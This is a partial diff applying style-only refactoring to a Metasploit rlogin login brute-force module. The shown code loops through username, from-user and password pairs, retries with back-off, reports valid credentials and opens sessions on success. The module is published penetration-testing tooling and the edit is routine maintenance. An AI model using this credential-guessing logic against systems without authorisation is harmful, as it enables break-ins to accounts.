@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -38,7 +38,8 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(513),
         OptString.new('TERM',  [ true, 'The terminal type desired', 'vt100' ]),
         OptString.new('SPEED', [ true, 'The terminal speed desired', '9600' ])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -51,30 +52,30 @@ class MetasploitModule < Msf::Auxiliary
     return :abort if [ :refused, :bind_error ].include? status
 
     begin
-      each_user_fromuser_pass { |user, fromuser, pass|
+      each_user_fromuser_pass do |user, fromuser, pass|
         ret = try_user_pass(user, fromuser, pass, status)
         status = nil
         ret
-      }
+      end
     rescue ::Rex::ConnectionError
       nil
     end
   end
 
-  def each_user_fromuser_pass(&block)
+  def each_user_fromuser_pass
     # Class variables to track credential use (for threading)
     @@credentials_tried = {}
     @@credentials_skipped = {}
 
     credentials = extract_word_pair(datastore['USERPASS_FILE'])
 
-    translate_proto_datastores()
+    translate_proto_datastores
 
     users = load_user_vars(credentials)
-    fromusers = load_fromuser_vars()
+    fromusers = load_fromuser_vars
     passwords = load_password_vars(credentials)
 
-    cleanup_files()
+    cleanup_files
 
     if datastore['BLANK_PASSWORDS']
       credentials = gen_blank_passwords(users, credentials)
@@ -86,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     # Okay, now we have a list of credentials to try. We want to merge in
     # our list of from users for each user.
     indexes = {}
-    credentials.map! { |u,p|
+    credentials.map! do |u, p|
       idx = indexes[u]
       idx ||= 0
 
@@ -98,17 +99,17 @@ class MetasploitModule < Msf::Auxiliary
         indexes[u] = idx + 1
       end
       [ u, pa ]
-    }
+    end
 
     # If there are more fromusers than passwords, append nil passwords, which will be handled
     # specially by the login processing.
-    indexes.each_key { |u|
+    indexes.each_key do |u|
       idx = indexes[u]
       while idx < fromusers.length
         credentials << [ u, [ fromusers[idx], nil ] ]
         idx += 1
       end
-    }
+    end
     indexes = {}
 
     # We do a second uniq! pass in case we added some dupes somehow
@@ -126,8 +127,8 @@ class MetasploitModule < Msf::Auxiliary
       next if @@credentials_skipped[fq_user]
       next if @@credentials_tried[fq_user] == fupw
 
-      fu,p = fupw
-      ret = block.call(u, fu, p)
+      fu, p = fupw
+      ret = yield(u, fu, p)
 
       case ret
       when :abort # Skip the current host entirely.
@@ -135,9 +136,7 @@ class MetasploitModule < Msf::Auxiliary
 
       when :next_user # This means success for that user.
         @@credentials_skipped[fq_user] = fupw
-        if datastore['STOP_ON_SUCCESS'] # See?
-          @@credentials_skipped[fq_rest] = true
-        end
+        @@credentials_skipped[fq_rest] = true if datastore['STOP_ON_SUCCESS'] # See?
 
       when :skip_user # Skip the user in non-success cases.
         @@credentials_skipped[fq_user] = fupw
@@ -150,7 +149,6 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def try_user_pass(user, luser, pass, status = nil)
     luser ||= 'root'
 
@@ -158,7 +156,7 @@ class MetasploitModule < Msf::Auxiliary
 
     this_attempt ||= 0
     ret = nil
-    while this_attempt <= 3 and (ret.nil? or ret == :refused)
+    while (this_attempt <= 3) && (ret.nil? || (ret == :refused))
       if this_attempt > 0
         # power of 2 back-off
         select(nil, nil, nil, 2**this_attempt)
@@ -198,7 +196,6 @@ class MetasploitModule < Msf::Auxiliary
     ret
   end
 
-
   def do_login(user, pass, luser, status = nil)
     # Reset our accumulators for interacting with /bin/login
     @recvd = ''
@@ -206,7 +203,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # We must connect from a privileged port. This only occurs when status
     # is nil. That is, it only occurs when a connection doesn't already exist.
-    if not status
+    unless status
       status = connect_from_privileged_port
       return :refused if status == :refused
     end
@@ -224,10 +221,10 @@ class MetasploitModule < Msf::Auxiliary
     # NOTE: We report this here, since we are awfully convinced now that this is really
     # an rlogin service.
     report_service(
-      :host => rhost,
-      :port => rport,
-      :proto => 'tcp',
-      :name => 'login'
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      name: 'login'
     )
 
     # Receive the initial response
@@ -236,7 +233,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if busy_message?
-      self.sock.close unless self.sock.closed?
+      sock.close unless sock.closed?
       return :busy
     end
 
@@ -249,14 +246,14 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # no password to try, give up if luser isnt enough.
-    if not pass
+    unless pass
       vprint_error("#{target_host}:#{rport}, rlogin '#{user}' from '#{luser}' failed (no password to try)")
       return :fail
     end
 
     # Allow for slow echos
     1.upto(10) do
-      recv(self.sock, 0.10) unless @recvd.nil? || password_prompt?(@recvd)
+      recv(sock, 0.10) unless @recvd.nil? || password_prompt?(@recvd)
     end
 
     vprint_status("#{rhost}:#{rport} Prompt: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")
@@ -267,7 +264,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # Allow for slow echos
       1.upto(10) do
-        recv(self.sock, 0.10)
+        recv(sock, 0.10)
         break if login_succeeded?
       end
 
@@ -284,30 +281,28 @@ class MetasploitModule < Msf::Auxiliary
       if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
         return :succeeded # intentionally not :success
       else
-        self.sock.close unless self.sock.closed?
+        sock.close unless sock.closed?
         return :no_pass_prompt
       end
     end
 
   # For debugging only.
-  #rescue ::Exception
+  # rescue ::Exception
   #	print_error("#{$!}")
 
   ensure
-    disconnect()
+    disconnect
   end
 
-
   def start_rlogin_session(host, port, user, luser, pass, proof)
-
     auth_info = {
-      :host	=> host,
-      :port	=> port,
-      :sname => 'login',
-      :user	=> user,
-      :proof  => proof,
-      :source_type => "user_supplied",
-      :active => true
+      host: host,
+      port: port,
+      sname: 'login',
+      user: user,
+      proof: proof,
+      source_type: "user_supplied",
+      active: true
     }
 
     merge_me = {
@@ -315,22 +310,20 @@ class MetasploitModule < Msf::Auxiliary
       'USER_FILE'     => nil,
       'FROMUSER_FILE' => nil,
       'PASS_FILE'     => nil,
-      'USERNAME'      => user,
+      'USERNAME'      => user
     }
 
     if pass
-      auth_info.merge!(:pass => pass)
-      merge_me.merge!('PASSWORD' => pass)
+      auth_info[:pass] = pass
+      merge_me['PASSWORD'] = pass
       info = "RLOGIN #{user}:#{pass} (#{host}:#{port})"
     else
-      auth_info.merge!(:luser => luser)
-      merge_me.merge!('FROMUSER'=> luser)
+      auth_info[:luser] = luser
+      merge_me['FROMUSER'] = luser
       info = "RLOGIN #{user} from #{luser} (#{host}:#{port})"
     end
 
     report_auth_info(auth_info)
     start_session(self, info, merge_me)
-
   end
-
 end
